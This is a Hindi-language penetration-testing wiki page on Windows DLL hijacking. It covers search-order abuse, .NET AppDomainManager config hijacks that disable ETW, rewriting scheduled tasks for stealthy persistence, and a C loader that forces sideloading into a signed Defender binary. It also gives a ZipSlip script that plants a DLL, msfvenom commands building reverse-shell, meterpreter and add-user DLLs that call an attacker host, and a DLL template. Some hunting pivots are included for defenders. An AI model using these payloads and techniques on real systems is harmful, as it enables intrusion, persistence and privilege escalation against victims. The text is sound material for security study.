# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## बुनियादी जानकारी

DLL Hijacking में किसी भरोसेमंद application से malicious DLL लोड करवाने के लिए उसमें हेरफेर किया जाता है। इस शब्द में **DLL Spoofing, Injection और Side-Loading** जैसी कई रणनीतियाँ शामिल हैं। इसका उपयोग मुख्यतः code execution और persistence हासिल करने के लिए, और कम मामलों में privilege escalation के लिए किया जाता है। यहाँ escalation पर ध्यान केंद्रित होने के बावजूद, hijacking का तरीका अलग-अलग उद्देश्यों के लिए एक जैसा रहता है।

### आम तकनीकें

DLL Hijacking के लिए कई तरीके इस्तेमाल किए जाते हैं। उनकी प्रभावशीलता application की DLL loading strategy पर निर्भर करती है:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: असली DLL को malicious DLL से बदलना। वैकल्पिक रूप से, असली DLL की कार्यक्षमता बनाए रखने के लिए DLL Proxying का इस्तेमाल किया जा सकता है।
2. **DLL Search Order Hijacking**: malicious DLL को search path में वैध DLL से पहले रखना और application के search pattern का फ़ायदा उठाना।
3. **Phantom DLL Hijacking**: application के लिए ऐसी malicious DLL बनाना जिसे वह यह समझकर लोड करे कि यह कोई आवश्यक DLL है, जो वास्तव में मौजूद नहीं है।
4. **DLL Redirection**: application को malicious DLL की ओर निर्देशित करने के लिए `%PATH%` जैसे search parameters या `.exe.manifest` / `.exe.local` files में बदलाव करना।
5. **WinSxS DLL Replacement**: WinSxS directory में वैध DLL को उसके malicious विकल्प से बदलना। यह तरीका अक्सर DLL side-loading से जुड़ा होता है।
6. **Relative Path DLL Hijacking**: malicious DLL को copied application के साथ, user-controlled directory में रखना। यह Binary Proxy Execution techniques जैसा होता है।

Application अपना **DLL loader** भी लागू कर सकता है। कोई privileged process `Libraries` या `Plugins` जैसी child directory की सूची देख सकता है और सामान्य Windows DLL search order से स्वतंत्र रूप से, चुनी गई DLL किसी helper को दे सकता है। अगर कोई दूसरा account उस सटीक directory में files बना सकता है, तो इसे जाँच के लिए एक संकेत मानें: process identity, directory की प्रभावी ACL, file-selection rule और DLL लोड होने की प्रक्रिया तक पहुँच की पुष्टि करें। किसी executable के पास की directory का writable होना इस बात का प्रमाण नहीं है कि process वहाँ से DLL लोड करता है।

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

किसी भरोसेमंद **.NET Framework** process से attacker code लोड करवाने का एकमात्र तरीका classic DLL sideloading नहीं है। अगर target executable एक **managed** application है, तो CLR executable के नाम पर बनी **application configuration file** भी देखता है (उदाहरण के लिए, `Setup.exe.config`)। यह file custom **AppDomainManager** तय कर सकती है। अगर config, EXE के पास रखी attacker-controlled assembly को निर्दिष्ट करता है, तो CLR उसे **application के सामान्य code path से पहले** लोड करता है और भरोसेमंद process के भीतर चलाता है।<sup>[[24]](#references)</sup>

Microsoft के .NET Framework configuration schema के अनुसार, custom manager का इस्तेमाल करने के लिए `<appDomainManagerAssembly>` और `<appDomainManagerType>` दोनों मौजूद होने चाहिए।<sup>[[16]](#references)[[17]](#references)</sup>

न्यूनतम config:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

न्यूनतम मैनेजर:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

व्यावहारिक नोट्स:
- यह **केवल .NET Framework** के लिए लागू tradecraft है। यह Win32 DLL search order के बजाय CLR config parsing पर निर्भर करता है।
- होस्ट वास्तव में **managed EXE** होना चाहिए। तुरंत जांचने के लिए: `sigcheck -m target.exe`, `corflags target.exe` चलाएं, या PE metadata में **CLR Runtime Header** देखें।
- Config filename का executable name से हूबहू मेल होना चाहिए (`<binary>.config`) और आमतौर पर यह **EXE के बगल में** होता है।
- यह **signed Microsoft/vendor binaries** के साथ उपयोगी है, क्योंकि trusted EXE को बिना बदले छोड़ दिया जाता है, जबकि malicious managed assembly उसी process में execute होती है।
- यदि आपके पास पहले से कोई writable installer/update directory है, तो AppDomainManager hijacking को **पहले stage** के रूप में इस्तेमाल किया जा सकता है, जिसके बाद के stages में classic DLL sideloading या reflective loading की जा सकती है।

### Downloader + scheduled-task bootstrap के रूप में AppDomainManager

एक व्यावहारिक intrusion pattern में trusted managed EXE के साथ malicious `*.config` और malicious AppDomainManager DLL का उपयोग किया जाता है, जो केवल एक **छोटे bootstrapper** के रूप में काम करता है:<sup>[[25]](#references)</sup>

1. User `%USERPROFILE%\Downloads` जैसी किसी विश्वसनीय लगने वाली जगह से signed .NET installer या updater launch करता है।
2. साथ वाली config, legitimate app logic शुरू होने **से पहले** CLR से attacker assembly load करवाती है।
3. Malicious manager एक **path gate** लागू करता है (उदाहरण के लिए, केवल तभी आगे बढ़ना जब host EXE `Downloads` से चल रही हो, और second stage को केवल `%LOCALAPPDATA%` से चलने देना)।
4. जांच सफल होने पर, यह real payload को `%LOCALAPPDATA%\PerfWatson2.exe` जैसे user-writable path पर download करता है और scheduled task के जरिए persistence स्थापित करता है।

यह variant क्यों महत्वपूर्ण है:
- Signed host EXE अपरिवर्तित रहती है, इसलिए केवल main binary का hash देखने वाली triage में compromise छूट सकता है।
- साधारण **path-based anti-analysis** आम है: ZIP/EXE/DLL triad को Desktop, Temp या sandbox path पर ले जाने से जानबूझकर chain टूट सकती है।
- First-stage AppDomainManager DLL छोटी और low-noise रह सकती है, जबकि असली implant बाद में fetch किया जाता है।

इस pattern के साथ अक्सर देखा जाने वाला न्यूनतम persistence उदाहरण:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes:
- ` /rl highest` का अर्थ उस user/session के लिए **उपलब्ध सर्वोच्च स्तर** है; यह अपने-आप में SYSTEM तक escalation की गारंटी नहीं देता।
- इस technique को अक्सर classic missing-DLL search-order hijacking के बजाय **.NET config abuse के ज़रिए execution/persistence** के रूप में वर्गीकृत करना बेहतर होता है, हालांकि operators अक्सर दोनों को chain करते हैं।

Detection pivots:
- ऐसे signed .NET executables जिन्हें **ZIP extraction paths**, `Downloads`, `%TEMP%` या अन्य user-writable folders से लॉन्च किया जाता है और जिनके साथ **colocated** `<exe>.config` होता है।
- ऐसे नए scheduled tasks जिनका action `%LOCALAPPDATA%`, `%APPDATA%` या `Downloads` के अंदर मौजूद path की ओर इंगित करता है और जिनके नाम browser/vendor updaters जैसे लगते हैं।
- ऐसे अल्पकालिक managed bootstrap processes जो तुरंत कोई दूसरा EXE download करते हैं, फिर `schtasks.exe` चलाते हैं।
- ऐसे samples जो तब तक जल्दी exit हो जाते हैं, जब तक executable path किसी अपेक्षित user-profile directory से match न करे।

### sideload chain को फिर से चलाने के लिए किसी मौजूदा scheduled task को hijack करना

Persistence के लिए, केवल **नया task बनाने** की तलाश न करें। कुछ intrusion sets तब तक प्रतीक्षा करते हैं जब तक कोई वैध installer एक **सामान्य updater task** न बना दे, फिर मौजूदा task action को **rewrite** करते हैं, ताकि उसका मौजूदा नाम, author और trigger defenders को परिचित लगें।

दोबारा इस्तेमाल किया जा सकने वाला workflow:
1. वैध software install/run करें और पहचानें कि वह सामान्यतः कौन-सा task बनाता है।
2. Task XML export करें और मौजूदा `<Exec><Command>` / `<Arguments>` values नोट करें।<sup>[[23]](#references)</sup>
3. केवल action बदलें, ताकि task किसी user-writable staging directory से आपका **trusted host EXE** शुरू करे, जो फिर असली payload को side-load या AppDomain-load करे।
4. कोई नया, स्पष्ट persistence artifact बनाने के बजाय उसी task name को फिर से register करें।

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

यह अधिक stealthy क्यों है:
- Task का नाम अभी भी legitimate दिख सकता है (उदाहरण के लिए, किसी vendor का updater)।
- इसे **Task Scheduler service** launch करती है, इसलिए parent/ancestor validation में अक्सर `explorer.exe` के बजाय अपेक्षित scheduling chain दिखती है।
- जो DFIR teams सिर्फ **नए task names** खोजती हैं, वे ऐसे task को चूक सकती हैं जिसका registration पहले से मौजूद था, लेकिन जिसका action अब `%LOCALAPPDATA%`, `%APPDATA%` या किसी अन्य attacker-controlled path की ओर point करता है।

तेज़ी से जाँच के लिए:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML और `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata की तुलना baseline से करें।
- जब कोई **vendor-जैसा दिखने वाला updater task**, **user-writable directories** से execute हो या साथ में मौजूद `*.config` file वाली .NET EXE launch करे, तो alert करें।

> [!TIP]
> HTML staging, AES-CTR configs और .NET implants को DLL sideloading के साथ जोड़ने वाली step-by-step chain के लिए, नीचे दिया गया workflow देखें।

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Missing DLLs ढूँढ़ना

System में missing DLLs ढूँढ़ने का सबसे आम तरीका sysinternals के [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) को चलाना और **नीचे दिए गए 2 filters सेट करना** है:

![Common Techniques - Missing DLLs ढूँढ़ना: System में missing DLLs ढूँढ़ने का सबसे आम तरीका sysinternals के procmon को चलाना और नीचे दिए गए 2 filters सेट करना](<../../../images/image (961).png>)

![Common Techniques - Missing DLLs ढूँढ़ना: System में missing DLLs ढूँढ़ने का सबसे आम तरीका sysinternals के procmon को चलाना और नीचे दिए गए 2 filters सेट करना](<../../../images/image (230).png>)

और सिर्फ **File System Activity** दिखाएँ:

![Common Techniques - Missing DLLs ढूँढ़ना: और सिर्फ File System Activity दिखाएँ](<../../../images/image (153).png>)

अगर आप **सामान्य रूप से missing DLLs** ढूँढ़ रहे हैं, तो इसे कुछ **seconds** तक चलने दें।\
अगर आप **किसी खास executable में missing DLL** ढूँढ़ रहे हैं, तो **"Process Name" "contains" `<exec name>`** जैसा एक और filter सेट करें, उसे execute करें और events capture करना रोक दें।<sup>[[9]](#references)</sup>

## Missing DLLs का Exploitation

Privileges escalate करने के लिए ऐसी **DLL ढूँढ़ें जिसे कोई privileged process ऐसी location से load करने की कोशिश करता है जहाँ आप write कर सकते हैं**। ऐसा तब हो सकता है जब आप उस directory को control करते हों जिसे legitimate DLL वाली directory से पहले search किया जाता है, या जब माँगी गई DLL मौजूद न हो और आप searched directories में से किसी एक में write कर सकें।

### DLL Search Order

**[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **में आप जान सकते हैं कि DLLs किस तरह load होती हैं।**

**Windows applications** DLLs को **पहले से तय search paths** की एक निश्चित sequence में ढूँढ़ती हैं। DLL hijacking की समस्या तब आती है जब किसी harmful DLL को इनमें से किसी directory में रणनीतिक रूप से रखा जाता है, ताकि वह authentic DLL से पहले load हो जाए। इससे बचने के लिए application को आवश्यक DLLs के लिए absolute paths का उपयोग करना चाहिए।

नीचे **32-bit** systems का **DLL search order** दिया गया है:

1. वह directory जहाँ से application load हुई।
2. System directory। इस directory का path पाने के लिए [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function का उपयोग करें।(_C:\Windows\System32_)
3. 16-bit system directory। इस directory का path पाने के लिए कोई function नहीं है, लेकिन इसे search किया जाता है। (_C:\Windows\System_)
4. Windows directory। इस directory का path पाने के लिए [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function का उपयोग करें।
   1. (_C:\Windows_)
5. Current directory।
6. PATH environment variable में सूचीबद्ध directories। ध्यान दें कि इसमें **App Paths** registry key में निर्दिष्ट per-application path शामिल नहीं होता। DLL search path की गणना करते समय **App Paths** key का उपयोग नहीं किया जाता।

**SafeDllSearchMode** enabled होने पर यह **default** search order है। इसके disabled होने पर current directory दूसरे स्थान पर आ जाती है। इस feature को disable करने के लिए **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाएँ और इसे 0 पर set करें (default रूप से enabled होता है)।

अगर [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ call किया जाता है, तो search उस executable module की directory से शुरू होती है जिसे **LoadLibraryEx** load कर रहा है।

अंत में, DLL को नाम के बजाय absolute path से load किया जा सकता है। उस स्थिति में, Windows DLL के लिए सिर्फ उसी path को देखता है; नाम से माँगी गई dependencies पर लागू search order फिर भी लागू होता है।

Search order बदलने के दूसरे तरीके भी हैं, लेकिन मैं यहाँ उनकी व्याख्या नहीं करूँगा।

### किसी arbitrary file write को missing-DLL hijack में chain करना

**संबंधित technique:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) का उपयोग करके उन DLL names को इकट्ठा करें जिन्हें process ढूँढ़ने की कोशिश करता है, लेकिन नहीं ढूँढ़ पाता।<sup>[[14]](#references)</sup>
2. अगर binary **schedule/service** पर चलती है, तो इनमें से किसी नाम वाली DLL को **application directory** (search-order entry #1) में रखने पर वह अगले execution में load होगी। .NET scanner के एक मामले में process, असली copy को `C:\Program Files\dotnet\fxr\...` से load करने से पहले `C:\samples\app\` में `hostfxr.dll` ढूँढ़ रहा था।
3. किसी भी export के साथ payload DLL (उदाहरण के लिए, reverse shell) बनाएँ: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. अगर आपका primitive **ZipSlip-जैसा arbitrary write** है, तो ऐसी ZIP बनाएँ जिसकी entry extraction dir से बाहर निकलकर DLL को app folder में रखे:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Archive को monitored inbox/share में पहुँचाएँ; जब scheduled task process को दोबारा launch करेगा, तो यह malicious DLL लोड करेगा और service account के रूप में आपका code चलाएगा।

### RTL_USER_PROCESS_PARAMETERS.DllPath के ज़रिए sideloading को बाध्य करना

नए बनाए गए process का DLL search path निश्चित रूप से प्रभावित करने का एक advanced तरीका यह है कि ntdll के native APIs से process बनाते समय RTL_USER_PROCESS_PARAMETERS में DllPath field सेट किया जाए। यहाँ attacker-controlled directory देने पर, जिस target process को नाम से imported DLL resolve करनी हो (बिना absolute path के और safe loading flags का इस्तेमाल किए बिना), उसे उस directory से malicious DLL लोड करने के लिए बाध्य किया जा सकता है।

मुख्य विचार
- RtlCreateProcessParametersEx से process parameters बनाएँ और custom DllPath में अपने नियंत्रण वाले folder का path दें (जैसे, वह directory जहाँ आपका dropper/unpacker मौजूद है)।
- RtlCreateUserProcess से process बनाएँ। जब target binary किसी DLL को नाम से resolve करेगी, तो loader resolution के दौरान दिए गए DllPath को देखेगा। इससे reliable sideloading संभव होती है, भले ही malicious DLL target EXE के साथ उसी directory में न हो।

नोट्स/सीमाएँ
- इसका असर बनाए जा रहे child process पर होता है; यह SetDllDirectory से अलग है, जो केवल current process को प्रभावित करता है।
- Target को नाम से DLL import या LoadLibrary करना चाहिए (बिना absolute path के और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का इस्तेमाल किए बिना)।
- KnownDLLs और hardcoded absolute paths को hijack नहीं किया जा सकता। Forwarded exports और SxS precedence बदल सकते हैं।

न्यूनतम C उदाहरण (ntdll, wide strings, सरलीकृत error handling):

<details>
<summary>पूरा C उदाहरण: RTL_USER_PROCESS_PARAMETERS.DllPath के ज़रिए DLL sideloading को बाध्य करना</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

ऑपरेशनल उपयोग का उदाहरण
- अपने DllPath directory में एक malicious xmllite.dll रखें (जो आवश्यक functions export करे या असली DLL को proxy करे)।
- ऐसा signed binary launch करें जिसके बारे में पता हो कि वह ऊपर दी गई technique का उपयोग करके xmllite.dll को नाम से खोजता है। Loader, दिए गए DllPath के ज़रिए import को resolve करता है और आपकी DLL को sideload करता है।

वास्तविक दुनिया में इस technique का उपयोग multi-stage sideloading chains चलाने के लिए देखा गया है: एक शुरुआती launcher helper DLL drop करता है, जो फिर custom DllPath के साथ Microsoft-signed, hijackable binary spawn करता है, ताकि attacker की DLL staging directory से load हो।<sup>[[6]](#references)</sup>


### `.exe.config` के ज़रिए .NET AppDomainManager hijacking

**.NET Framework** targets के लिए, memory patch किए बिना **`Main()` से पहले** sideloading की जा सकती है। इसके लिए application की साथ वाली **`.exe.config`** file का दुरुपयोग किया जाता है। केवल Win32 DLL search order पर निर्भर रहने के बजाय, attacker एक legitimate .NET EXE के साथ malicious config और attacker-controlled assemblies रखता है।

यह chain कैसे काम करती है:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE शुरू होता है और **CLR `<exe>.config` को पढ़ता है**।
2. Config, **`<appDomainManagerAssembly>`** और **`<appDomainManagerType>`** सेट करता है, ताकि runtime attacker-controlled `AppDomainManager` को instantiate करे।
3. Malicious manager को trusted host process के भीतर **`Main()` से पहले execution** मिलता है।
4. यही config, CLR को पहले local assemblies resolve करने के लिए बाध्य कर सकता है (उदाहरण के लिए `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) और inline patching के बिना runtime validation/telemetry को कमज़ोर कर सकता है।

Campaign-style pattern (directive / CLR version के अनुसार nesting में बदलाव हो सकता है):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

यह क्यों उपयोगी है:
- **`<probing privatePath="."/>`** assembly resolution को application directory तक सीमित रखता है, जिससे यह फ़ोल्डर एक अनुमानित sideloading surface बन जाता है।<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** CLR initialization के दौरान, legitimate app logic चलने से पहले, execution को attacker code में ले जाते हैं।<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** full-trust app को strong-name validation failure के बिना unsigned या tampered assemblies load करने दे सकता है।<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** publisher-policy redirects को newer assemblies पर जाने से रोकता है।<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** runtime selection को अधिक अनुमानित बनाता है।<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** विशेष रूप से दिलचस्प है, क्योंकि configuration से **CLR अपनी ETW visibility बंद कर देता है**—implant को memory में `EtwEventWrite` patch करने की ज़रूरत नहीं पड़ती।

हालिया campaigns में देखा गया operational pattern:
- Stage 1 में `setup.exe`, `setup.exe.config`, और local assemblies रखी जाती हैं।
- Stage 2 में इन्हें एक विश्वसनीय दिखने वाले **AppData update** फ़ोल्डर में copy किया जाता है, host का नाम बदलकर `update.exe` जैसा कुछ रखा जाता है, और फिर **scheduled task** के ज़रिए उसे दोबारा launch किया जाता है।
- Stage 3 में final RAT DLL/export load करने से पहले execution context की पुष्टि की जाती है (उदाहरण के लिए, Task Scheduler से अपेक्षित parent `svchost.exe` है या नहीं)।

Hunting के सुझाव:
- User-writable locations में संदिग्ध साथ की **`.config`** files के साथ चलने वाले signed या अन्यथा legitimate **.NET executables**।
- ऐसी `.config` files जिनमें **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, या **`etwEnable enabled="false"`** हों।
- ऐसे scheduled tasks जो **`%LOCALAPPDATA%`** या app-specific `\bin\update\` directories से renamed update binaries को दोबारा launch करते हैं।
- ऐसे parent/child chains जिनमें scheduled task किसी trusted .NET host को launch करता है, जो तुरंत अपनी directory से non-vendor assemblies load करता है।

#### Windows docs में DLL search order के अपवाद

Windows documentation में standard DLL search order के कुछ अपवाद बताए गए हैं:

- जब memory में पहले से loaded DLL के समान नाम वाली **DLL** मिलती है, तो system सामान्य search को छोड़ देता है। इसके बजाय, वह redirection और manifest की जाँच करता है, और उसके बाद memory में पहले से मौजूद DLL को चुनता है। **इस स्थिति में system DLL को search नहीं करता**।
- अगर DLL को मौजूदा Windows version के लिए **known DLL** के रूप में पहचाना जाता है, तो system search process को **छोड़कर**, अपने known DLL version और उसकी dependent DLLs का उपयोग करता है। Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** में इन known DLLs की सूची होती है।
- अगर किसी **DLL की dependencies** हैं, तो उन dependent DLLs को ऐसे search किया जाता है मानो उन्हें केवल उनके **module names** से दर्शाया गया हो—भले ही शुरुआती DLL को full path से पहचाना गया हो।

### Privileges बढ़ाना

**आवश्यकताएँ**:

- ऐसा process पहचानें जो **अलग privileges** के तहत काम करता है या करेगा (horizontal या lateral movement), और जिसमें **DLL मौजूद न हो**।
- सुनिश्चित करें कि उस **directory** में **write access** उपलब्ध हो जहाँ **DLL** को search किया जाएगा। यह executable की directory या system path के भीतर कोई directory हो सकती है।

ये prerequisites default रूप से आम नहीं हैं: privileged executables में आमतौर पर DLL dependencies missing नहीं होतीं, और standard users सामान्यतः system search-path directories में write नहीं कर सकते। फिर भी, misconfigured environments में दोनों स्थितियाँ हो सकती हैं।\
अगर आवश्यकताएँ पूरी होती हैं, तो [UACME](https://github.com/hfiref0x/UACME) project देखें। इसका मुख्य उद्देश्य UAC bypass है, लेकिन इसमें कुछ Windows versions के लिए DLL-hijacking PoCs हैं, जिन्हें अक्सर आपके मिले writable directory के अनुसार बदला जा सकता है।

ध्यान दें कि आप **किसी folder में अपनी permissions** इस तरह **जाँच सकते हैं**:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

और **PATH में मौजूद सभी फ़ोल्डरों की permissions जाँचें**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

आप executable के imports और dll के exports भी जाँच सकते हैं:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

**System Path folder** में write permissions के साथ privileges escalate करने के लिए **DLL Hijacking का दुरुपयोग कैसे करें**, इसकी पूरी guide के लिए देखें:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)जाँच करेगा कि क्या आपके पास system PATH के किसी भी folder में write permissions हैं।\
इस vulnerability को खोजने के लिए अन्य उपयोगी automated tools हैं **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll._

### Example

अगर आपको कोई exploitable scenario मिलता है, तो उसे सफलतापूर्वक exploit करने के लिए सबसे ज़रूरी कामों में से एक है **ऐसी dll बनाना जो कम-से-कम उन सभी functions को export करे जिन्हें executable उससे import करेगा**। ध्यान दें कि DLL Hijacking, [Medium Integrity level से High तक escalate करने **(UAC को bypass करके)**](../../authentication-credentials-uac-and-efs/index.html#uac) या [**High Integrity से SYSTEM तक**](../index.html#from-high-integrity-to-system)**.** escalate करने में उपयोगी है। **Valid dll कैसे बनाएँ**, इसका एक example, execution के लिए DLL hijacking पर केंद्रित इस DLL hijacking study में मिल सकता है: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
इसके अलावा, **अगले section** में आपको कुछ **basic dll codes** मिलेंगे, जिन्हें **templates** के रूप में इस्तेमाल किया जा सकता है या **ऐसी dll बनाने के लिए, जिसमें non-required functions export हों**।

## **DLLs बनाना और compile करना**

### **DLL Proxifying**

मूल रूप से, **DLL proxy** एक ऐसा DLL है जो **load होने पर आपका malicious code execute** कर सकता है, साथ ही **वास्तविक library को सभी calls relay करके** उसे expose करता है और उसके **अपेक्षित तरीके से काम** करता है।

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) tool से आप **किसी executable को निर्दिष्ट करके वह library चुन सकते हैं** जिसे proxify करना है, और **proxified dll generate कर सकते हैं**; या **DLL निर्दिष्ट करके** भी **proxified dll generate कर सकते हैं**।

### **Meterpreter**

**rev shell पाएँ (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**एक meterpreter (x86) प्राप्त करें:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**एक user बनाएँ (x86; मुझे x64 version नहीं मिला):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### आपका अपना

कई मामलों में, आपके द्वारा compile की गई DLL को **victim process द्वारा import किए गए हर function को export करना होगा**। यदि कोई आवश्यक export मौजूद नहीं है, तो binary उसे resolve नहीं कर पाएगी और exploit विफल हो जाएगा।

<details>
<summary>C DLL template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
